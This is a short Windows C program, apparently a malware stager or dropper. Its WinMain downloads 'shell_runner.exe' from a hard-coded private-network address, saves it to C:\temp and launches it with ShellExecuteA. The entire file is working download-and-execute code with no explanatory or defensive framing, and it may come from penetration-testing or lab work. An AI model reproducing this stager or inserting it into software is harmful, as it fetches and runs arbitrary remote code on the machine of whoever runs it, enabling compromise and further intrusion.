#include <windows.h>
#include <urlmon.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    (void)hInstance;
    (void)hPrevInstance;
    (void)lpCmdLine;
    (void)nCmdShow;

    HRESULT hr = URLDownloadToFileA(
        NULL,
        "http://192.168.1.111/shell_runner.exe",
        "C:\\temp\\shell_runner.exe",
        0,
        NULL);

    if (SUCCEEDED(hr))
    {
        ShellExecuteA(NULL, "open", "C:\\temp\\shell_runner.exe 9144", NULL, NULL, SW_SHOWNORMAL);
    }
    else
    {
        MessageBoxA(NULL, "Download failed!", "Error", MB_ICONERROR);
    }

    return 0;
}
